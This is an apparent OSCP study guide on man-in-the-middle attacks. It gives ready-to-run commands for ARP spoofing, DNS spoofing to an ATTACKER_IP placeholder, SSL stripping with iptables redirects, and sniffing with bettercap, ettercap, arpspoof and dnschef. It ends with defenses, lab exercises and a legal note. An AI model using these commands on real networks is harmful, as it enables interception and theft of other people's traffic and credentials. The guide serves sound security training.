# Man-in-the-Middle (MITM) Attacks

Man-in-the-Middle (MITM) attacks involve intercepting and potentially altering communications between two parties. This guide covers common MITM techniques and tools for the OSCP exam.

## 📋 Table of Contents
1. [ARP Spoofing](#arp-spoofing)
2. [DNS Spoofing](#dns-spoofing)
3. [SSL Stripping](#ssl-stripping)
4. [Ettercap](#ettercap)
5. [Bettercap](#bettercap)
6. [Defense](#-defense)
7. [Practice](#-practice)

## ARP Spoofing

### ARP Cache Poisoning
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Using arpspoof
arpspoof -i eth0 -t TARGET_IP ROUTER_IP
arpspoof -i eth0 -t ROUTER_IP TARGET_IP

# Using bettercap
set arp.spoof.targets TARGET_IP
arp.spoof on
```

### Verify ARP Cache
On target machine:
```bash
arp -a
```

## DNS Spoofing

### Using bettercap
```bash
# Start bettercap
bettercap -iface eth0

# Enable DNS server
set dns.spoof.all true
set dns.spoof.domains example.com
set dns.spoof.address ATTACKER_IP
dns.spoof on
```

### Using dnschef
```bash
dnschef --interface 0.0.0.0 --nameserver 8.8.8.8 --fakeip ATTACKER_IP --fakedomains example.com
```

## SSL Stripping

### Using sslstrip2 (bettercap)
```bash
# In bettercap
set http.proxy.sslstrip true
http.proxy on

# Or with sslstrip
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### Using mitmproxy
```bash
mitmproxy -T --host -w outfile
```

## Ettercap

### Installation
```bash
# Kali Linux
sudo apt install ettercap-graphical
```

### Basic Usage
```bash
# Text mode
sudo ettercap -T -i eth0 -M arp:remote /TARGET_IP// /ROUTER_IP//

# With DNS spoofing
sudo ettercap -T -i eth0 -P dns_spoof -M arp:remote /TARGET_IP// /ROUTER_IP//
```

## Bettercap

### Installation
```bash
# Kali Linux
sudo apt install bettercap
```

### Basic Usage
```bash
# Start bettercap
sudo bettercap -iface eth0

# ARP spoofing
set arp.spoof.targets TARGET_IP
arp.spoof on

# Sniff traffic
net.sniff on

# Enable HTTP proxy
set http.proxy.sslstrip true
http.proxy on
```

## 🛡 Defense

### ARP Spoofing Protection
- **Static ARP entries**: `arp -s IP MAC`
- **ARP monitoring tools**: arpwatch, XArp
- **Port security**: On network switches

### SSL/TLS Protection
- **HSTS**: HTTP Strict Transport Security
- **Certificate Pinning**: In mobile apps
- **DNSSEC**: For DNS security

### Network Segmentation
- **VLANs**: Separate sensitive traffic
- **802.1X**: Port-based network access control
- **Encryption**: Use VPNs for remote access

## 🛠 Tools

### MITM Tools
- **Ettercap**: Comprehensive MITM suite
- **Bettercap**: Modular MITM framework
- **MITMf**: Framework for MITM attacks
- **EtherApe**: Network traffic monitor

### Traffic Analysis
- **Wireshark**: Network protocol analyzer
- **Tcpdump**: Command-line packet analyzer
- **Driftnet**: Captures images from network traffic

## 📚 Resources
- [MITM Attack Explained](https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/)
- [Bettercap Documentation](https://www.bettercap.org/)
- [Ettercap Documentation](https://www.ettercap-project.org/)
- [MITM Attack Prevention](https://www.cloudflare.com/learning/security/threats/man-in-the-middle-attack/)

## 🎯 Practice
1. Set up a lab environment with virtual machines
2. Practice ARP spoofing between VMs
3. Capture and analyze HTTP traffic
4. Try SSL stripping on unsecured websites

## ⚠️ Legal Note
Only perform MITM attacks on networks you own or have explicit permission to test. Unauthorized testing is illegal.
